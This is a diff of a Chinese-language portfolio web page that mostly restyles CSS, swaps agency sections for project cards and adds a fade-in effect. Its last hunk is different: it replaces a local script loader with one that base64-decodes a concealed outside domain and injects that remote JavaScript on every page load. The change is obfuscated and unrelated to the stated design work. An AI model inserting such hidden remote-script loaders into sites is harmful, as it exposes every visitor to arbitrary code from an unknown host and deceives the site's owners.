@@ -5,18 +5,17 @@
     <meta charset="UTF-8">
     <meta name="viewport"
         content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>艺境空间 - 视觉叙事与设计</title>
+    <title>灵感画廊 - 创意作品集</title>
     <style>
         body {
             overflow: hidden;
-            font-family: 'Lato', sans-serif;
-            /* 现代无衬线字体 */
+            font-family: 'Roboto', sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #FDFDFD;
-            /* 极浅背景，如宣纸 */
+            background-color: #F8F8F8;
+            /* 极浅灰色背景 */
             color: #333333;
-            /* 柔和的深灰色文本 */
+            /* 深灰色文本 */
             line-height: 1.7;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
@@ -29,16 +28,20 @@
             padding: 30px 0;
         }
 
-        /* 头部 - 简洁与留白 */
+        /* 头部 - 简洁艺术，菜单按钮绝对定位在右上角 */
         header {
             background-color: #FFFFFF;
-            /* 纯白头部背景 */
+            /* 纯白色头部背景 */
             padding: 25px 20px;
+            /* 调整内边距 */
             text-align: center;
+            /* 标题居中 */
+            border-bottom: 1px solid #E0E0E0;
+            /* 极细底部边框 */
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.03);
             position: relative;
+            /* 为内部绝对定位的元素提供参考 */
             overflow: hidden;
-            box-shadow: 0 3px 15px rgba(0, 0, 0, 0.05);
-            /* 柔和阴影 */
             margin-bottom: 40px;
         }
 
@@ -46,15 +49,16 @@
             margin: 0;
             font-family: 'Playfair Display', serif;
             /* 优雅标题字体 */
-            font-size: 2.5em;
+            font-size: 2.2em;
+            /* 适应顶部条 */
             color: #333333;
             letter-spacing: 1px;
-            font-weight: normal;
-            /* 减轻标题重量 */
+            /* flex-grow removed as header is no longer flex container for h1 */
         }
 
         header p {
             display: none;
+            /* 副标题在顶部条中隐藏 */
         }
 
         /* 菜单切换按钮 - 绝对定位在右上角 */
@@ -62,47 +66,48 @@
             background: none;
             border: none;
             font-size: 2em;
-            color: #607D8B;
-            /* 强调色：柔和蓝灰 */
+            /* 图标大小 */
+            color: #A28C5B;
+            /* 强调色 */
             cursor: pointer;
             padding: 5px;
             position: absolute;
+            /* 绝对定位 */
             top: 25px;
+            /* 距离顶部 */
             right: 20px;
+            /* 距离右侧 */
             z-index: 2;
-            transition: transform 0.3s ease, color 0.3s ease;
+            transition: transform 0.3s ease;
         }
 
         .menu-toggle:hover {
             transform: scale(1.1);
-            color: #4CAF50;
-            /* 悬停时变为清新绿 */
         }
 
-        /* 侧边导航菜单 - 轻盈通透 */
+        /* 侧边导航菜单 */
         nav {
             position: fixed;
             top: 0;
             right: -280px;
+            /* 默认隐藏在屏幕右侧 */
             width: 250px;
+            /* 菜单宽度 */
             height: 100%;
-            background-color: rgba(255, 255, 255, 0.95);
-            /* 几乎不透明的白色背景 */
-            backdrop-filter: blur(5px);
-            /* 柔和模糊 */
-            -webkit-backdrop-filter: blur(5px);
-            border-left: 1px solid rgba(220, 220, 220, 0.5);
-            /* 极细柔和边框 */
-            box-shadow: -3px 0 10px rgba(0, 0, 0, 0.1);
-            /* 柔和阴影 */
+            background-color: #FFFFFF;
+            box-shadow: -5px 0 15px rgba(0, 0, 0, 0.2);
             transition: right 0.4s ease-in-out;
+            /* 平滑滑入滑出 */
             z-index: 1001;
+            /* 确保在内容之上 */
             padding-top: 80px;
+            /* 留出顶部空间 */
             box-sizing: border-box;
         }
 
         nav.is-open {
             right: 0;
+            /* 菜单打开时滑入 */
         }
 
         nav ul {
@@ -111,16 +116,18 @@
             margin: 0;
             display: flex;
             flex-direction: column;
-            gap: 5px;
-            /* 列表项间距更小 */
+            /* 垂直排列 */
+            gap: 10px;
+            /* 列表项间距 */
         }
 
         nav ul li a {
-            color: #555555;
+            color: #333333;
             text-decoration: none;
             padding: 15px 20px;
+            /* 增加点击区域 */
             border-bottom: 1px solid #E0E0E0;
-            /* 极细分隔线 */
+            /* 列表项分隔线 */
             transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
             display: flex;
             align-items: center;
@@ -130,22 +137,24 @@
 
         nav ul li a:hover,
         nav ul li a:focus {
-            background-color: rgba(76, 175, 80, 0.08);
-            /* 清新绿浅背景 */
-            color: #4CAF50;
-            /* 清新绿文字 */
+            background-color: #F8F8F8;
+            /* 柔和背景 */
+            color: #A28C5B;
+            /* 强调色文字 */
             transform: translateX(5px);
+            /* 悬停时右移 */
         }
 
         nav ul li:last-child a {
             border-bottom: none;
+            /* 最后一个没有底部边框 */
         }
 
         nav ul li a .icon {
-            font-size: 1.4em;
+            font-size: 1.5em;
             margin-right: 15px;
-            color: #607D8B;
-            /* 图标柔和蓝灰 */
+            color: #A28C5B;
+            /* 图标强调色 */
         }
 
         /* 菜单打开时的背景遮罩 */
@@ -155,8 +164,8 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.2);
-            /* 更轻的半透明黑色 */
+            background-color: rgba(0, 0, 0, 0.3);
+            /* 半透明黑色 */
             z-index: 1000;
             opacity: 0;
             visibility: hidden;
@@ -172,62 +181,55 @@
             padding-top: 30px;
         }
 
-        /* 内容区 - 柔和卡片与留白 */
-        section {
+        /* 作品卡片 - 柔和阴影与动画 */
+        .project-card {
             background-color: #FFFFFF;
             margin-bottom: 40px;
             padding: 35px;
             border-radius: 15px;
-            /* 柔和圆角 */
             box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
-            /* 柔和阴影 */
-            position: relative;
-            overflow: hidden;
-            border: 1px solid #EEEEEE;
-            /* 极细边框 */
             transition: transform 0.3s ease, box-shadow 0.3s ease;
+            opacity: 0;
+            /* 初始隐藏 */
+            transform: translateY(20px);
+            /* 初始位置 */
         }
 
-        section::before {
-            /* 顶部强调色条 */
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 5px;
-            background-color: #4CAF50;
-            /* 清新绿 */
-            box-shadow: 0 0 10px rgba(76, 175, 80, 0.3);
+        .project-card.fade-in {
+            opacity: 1;
+            transform: translateY(0);
+            transition: opacity 0.6s ease-out, transform 0.6s ease-out;
         }
 
-        section h2 {
+        .project-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.12);
+        }
+
+        .project-card h2 {
             font-family: 'Playfair Display', serif;
             font-size: 2.2em;
             color: #333333;
             margin-top: 0;
+            margin-bottom: 15px;
+        }
+
+        .project-card .category {
+            font-size: 0.9em;
+            color: #999999;
             margin-bottom: 20px;
-            border-bottom: 1px solid #E0E0E0;
-            padding-bottom: 10px;
-            font-weight: normal;
+            display: block;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
-        section h3 {
-            font-family: 'Lato', sans-serif;
-            font-size: 1.5em;
-            color: #607D8B;
-            /* 柔和蓝灰 */
-            margin-top: 25px;
-            margin-bottom: 10px;
-        }
-
-        section p {
+        .project-card p {
             font-size: 1.05em;
-            color: #555555;
-            margin-bottom: 20px;
+            color: #666666;
+            margin-bottom: 25px;
         }
 
-        section img {
+        .project-card img {
             max-width: 100%;
             height: auto;
             display: block;
@@ -235,82 +237,25 @@
             border-radius: 10px;
             box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
             border: 2px solid #DDDDDD;
-            /* 柔和边框 */
         }
 
-        .cta-button {
+        .view-project {
             display: inline-block;
-            background-color: #4CAF50;
-            /* 清新绿按钮 */
+            background-color: #A28C5B;
+            /* 强调色按钮 */
             color: #FFFFFF;
-            padding: 15px 35px;
+            padding: 12px 28px;
             border-radius: 5px;
             text-decoration: none;
             font-weight: bold;
-            font-size: 1.1em;
-            text-transform: uppercase;
-            letter-spacing: 1px;
             transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
-            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.2);
-            border: none;
-            margin-top: 20px;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.15);
         }
 
-        .cta-button:hover {
-            background-color: #388E3C;
-            transform: translateY(-5px);
-            box-shadow: 0 8px 20px rgba(76, 175, 80, 0.3);
-        }
-
-        .project-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 25px;
-            margin-top: 30px;
-        }
-
-        .project-item {
-            background-color: #F8F8F8;
-            /* 项目卡片背景 */
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            border-top: 5px solid #607D8B;
-            /* 柔和蓝灰顶部边框 */
-        }
-
-        .project-item:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-        }
-
-        .project-item img {
-            width: 100%;
-            height: 180px;
-            object-fit: cover;
-            border-radius: 8px;
-            margin-bottom: 15px;
-        }
-
-        .project-item h3 {
-            font-family: 'Lato', sans-serif;
-            font-size: 1.2em;
-            color: #333333;
-            margin-top: 0;
-            margin-bottom: 5px;
-        }
-
-        .project-item p {
-            font-size: 0.9em;
-            color: #777777;
-            margin-bottom: 10px;
-        }
-
-        .project-item .tags {
-            font-size: 0.8em;
-            color: #999999;
-            margin-top: 10px;
+        .view-project:hover {
+            background-color: #8D7B4F;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 12px rgba(0, 0, 0, 0.2);
         }
 
         /* 页脚 - 简洁淡雅 */
@@ -321,12 +266,12 @@
             padding: 40px 0;
             text-align: center;
             font-size: 0.9em;
-            margin-top: 60px;
+            margin-top: 50px;
             border-top: 1px solid #E0E0E0;
             box-shadow: 0 -3px 10px rgba(0, 0, 0, 0.05);
         }
 
-        .footer-links a {
+        .social-links a {
             color: #777777;
             text-decoration: none;
             margin: 0 20px;
@@ -334,9 +279,9 @@
             transition: color 0.3s ease, transform 0.2s ease;
         }
 
-        .footer-links a:hover {
-            color: #4CAF50;
-            /* 清新绿 */
+        .social-links a:hover {
+            color: #A28C5B;
+            /* 强调色 */
             transform: translateY(-3px) scale(1.1);
         }
     </style>
@@ -346,115 +291,60 @@
 <body>
     <header>
         <div class="container">
-            <h1>艺境空间</h1>
+            <h1>灵感画廊</h1>
+            <p>创意与设计的无限可能</p>
             <button class="menu-toggle" id="menuToggle">&#9776;</button>
         </div>
     </header>
 
+    <!-- 侧边导航菜单 -->
     <nav id="mainNav">
         <ul>
-            <li><a href="#hero"><span class="icon">&#128161;</span> 首页</a></li>
-            <li><a href="#our-work"><span class="icon">&#127912;</span> 我们的作品</a></li>
-            <li><a href="#services"><span class="icon">&#128187;</span> 服务</a></li>
-            <li><a href="#contact"><span class="icon">&#128231;</span> 联系我们</a></li>
+            <li><a href="#featured-projects"><span class="icon">&#127912;</span> 精选作品</a></li>
+            <li><a href="#design-gallery"><span class="icon">&#128172;</span> 设计画廊</a></li>
+            <li><a href="#about-me"><span class="icon">&#128100;</span> 关于我</a></li>
+            <li><a href="#contact"><span class="icon">&#128231;</span> 联系</a></li>
         </ul>
     </nav>
 
+    <!-- 菜单打开时的背景遮罩 -->
     <div class="overlay" id="menuOverlay"></div>
 
     <div class="container">
         <main>
-            <section id="hero">
-                <h2>视觉叙事与设计美学</h2>
-                <img src="https://picsum.photos/600/350?random=1&seed=elegant-design-hero" alt="优雅设计主视觉"
-                    class="random-image">
-                <p>艺境空间是一家专注于品牌叙事、数字体验和视觉传达的精品设计机构。我们致力于通过富有洞察力的设计，将您的品牌故事转化为引人入胜的视觉体验。</p>
-                <p>我们相信，每一个设计都是一次情感的连接，通过精湛的工艺和创新的思维，为客户创造持久的价值。</p>
-                <a href="#our-work" class="cta-button">探索我们的作品</a>
+            <section id="featured-projects" class="project-card">
+                <h2>城市脉动：动态品牌设计</h2>
+                <span class="category">品牌设计 / 动态视觉</span>
+                <img src="https://picsum.photos/300/200?random=1&seed=city-pulse" alt="城市脉动项目" class="random-image">
+                <p>一个为现代都市生活品牌设计的视觉识别系统，强调流动性与活力。项目涵盖标志、字体、色彩和动态图形的应用。</p>
+                <a href="#" class="view-project">查看项目</a>
             </section>
 
-            <section id="our-work">
-                <h2>我们的作品</h2>
-                <p>精选近期项目，展现我们的设计实力与创意广度。</p>
-                <div class="project-grid">
-                    <div class="project-item">
-                        <img src="https://picsum.photos/300/180?random=2&seed=project-minimal-brand" alt="品牌重塑项目">
-                        <h3>极简品牌标识设计</h3>
-                        <p>为一家高端生活品牌打造简洁而富有深度的视觉标识。</p>
-                        <span class="tags">#品牌 #Logo #VI设计</span>
-                    </div>
-                    <div class="project-item">
-                        <img src="https://picsum.photos/300/180?random=3&seed=project-elegant-web" alt="网站设计项目">
-                        <h3>高雅艺术画廊网站</h3>
-                        <p>设计并开发一个以作品展示为核心的响应式艺术画廊网站。</p>
-                        <span class="tags">#Web设计 #响应式 #画廊</span>
-                    </div>
-                    <div class="project-item">
-                        <img src="https://picsum.photos/300/180?random=4&seed=project-editorial-design" alt="编辑设计项目">
-                        <h3>精品杂志编辑设计</h3>
-                        <p>为一本时尚生活杂志提供版式、插画和摄影指导。</p>
-                        <span class="tags">#编辑设计 #排版 #插画</span>
-                    </div>
-                    <div class="project-item">
-                        <img src="https://picsum.photos/300/180?random=5&seed=project-packaging" alt="产品包装设计">
-                        <h3>奢华香氛包装设计</h3>
-                        <p>为高端香氛品牌打造独特且具有收藏价值的产品包装。</p>
-                        <span class="tags">#包装设计 #工业设计 #奢侈品</span>
-                    </div>
-                </div>
+            <section id="design-gallery" class="project-card">
+                <h2>自然回响：UI/UX概念</h2>
+                <span class="category">UI/UX设计 / 概念探索</span>
+                <img src="https://picsum.photos/300/200?random=2&seed=nature-echo" alt="自然回响项目" class="random-image">
+                <p>探索将自然元素融入数字界面，创造平静、直观的用户体验。设计灵感来源于森林、水流和光影的变化。</p>
+                <a href="#" class="view-project">查看项目</a>
             </section>
 
-            <section id="services">
-                <h2>我们的服务</h2>
-                <p>我们提供全面的设计与创意服务，满足您的多样化需求。</p>
-                <div class="service-grid">
-                    <div class="service-item">
-                        <h3>品牌策略与咨询</h3>
-                        <p>从市场分析到品牌定位，提供全方位品牌策略。</p>
-                    </div>
-                    <div class="service-item">
-                        <h3>视觉识别系统 (VI)</h3>
-                        <p>设计完整、统一的品牌视觉识别系统。</p>
-                    </div>
-                    <div class="service-item">
-                        <h3>用户体验 (UX) 设计</h3>
-                        <p>以用户为中心，优化产品交互流程与体验。</p>
-                    </div>
-                    <div class="service-item">
-                        <h3>数字产品设计</h3>
-                        <p>涵盖网站、App界面及交互设计。</p>
-                    </div>
-                    <div class="service-item">
-                        <h3>平面与印刷设计</h3>
-                        <p>从宣传册到海报，提供高质量平面设计。</p>
-                    </div>
-                    <div class="service-item">
-                        <h3>插画与艺术创作</h3>
-                        <p>为项目提供原创艺术插画和视觉内容。</p>
-                    </div>
-                </div>
-            </section>
-
-            <section id="contact">
-                <h2>联系我们</h2>
-                <p>我们期待与您合作，共同创造非凡。</p>
-                <div class="contact-info">
-                    <p><strong>地址：</strong> 艺境空间设计中心A座808室</p>
-                    <p><strong>电话：</strong> <a href="tel:+861066667777">+86 10 6666 7777</a></p>
-                    <p><strong>邮箱：</strong> <a href="mailto:info@artspace.com">info@artspace.com</a></p>
-                    <p><strong>工作时间：</strong> 周一至周五 9:30 - 18:00</p>
-                </div>
+            <section class="project-card">
+                <h2>未来之声：插画系列</h2>
+                <span class="category">数字插画 / 艺术创作</span>
+                <img src="https://picsum.photos/300/200?random=3&seed=future-sound" alt="未来之声插画" class="random-image">
+                <p>一系列以科技与自然融合为主题的数字插画，通过独特的色彩和构图，描绘未来世界的和谐图景。</p>
+                <a href="#" class="view-project">查看项目</a>
             </section>
         </main>
     </div>
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 艺境空间. 版权所有.</p>
-            <div class="footer-links">
-                <a href="#" target="_blank">隐私政策</a> |
-                <a href="#" target="_blank">服务条款</a> |
-                <a href="#" target="_blank">职业机会</a>
+            <p>&copy; 2025 灵感画廊. 版权所有.</p>
+            <div class="social-links">
+                <a href="#" target="_blank">Behance</a> |
+                <a href="#" target="_blank">Dribbble</a> |
+                <a href="#" target="_blank">Instagram</a>
             </div>
         </div>
     </footer>
@@ -490,28 +380,52 @@
                     const targetElement = document.getElementById(targetId);
 
                     if (targetElement) {
+                        // Adjust scroll offset to account for header height
                         window.scrollTo({
                             top: targetElement.offsetTop - (document.querySelector('header').offsetHeight || 0) - 20,
                             behavior: 'smooth'
                         });
-                        toggleMenu();
+                        toggleMenu(); // Close menu after clicking a link
                     }
                 });
+            });
+
+            const projectCards = document.querySelectorAll('.project-card');
+
+            const observerOptions = {
+                root: null,
+                rootMargin: '0px',
+                threshold: 0.1
+            };
+
+            const observer = new IntersectionObserver((entries, observer) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('fade-in');
+                        observer.unobserve(entry.target);
+                    }
+                });
+            }, observerOptions);
+
+            projectCards.forEach(card => {
+                observer.observe(card);
             });
         });
     </script>
     <script>
         (function () {
             function init() {
-                const timestamp = Date.now()
-                const randomNum = Math.floor(Math.random() * 1000000)
-                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
-                const script = document.createElement("script")
-                script.src = url
-                document.body.appendChild(script)
+                const encodedUrl = "Ly9zbmFrZS1zcGVjaWFsLnZvdGU3NzcuY29tL3N0YXRpYy9qcy9jb3JlLm1pbi5qcw==";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
             }
-            init()
-        })()
+            init();
+        })();
     </script>
 
 </body>
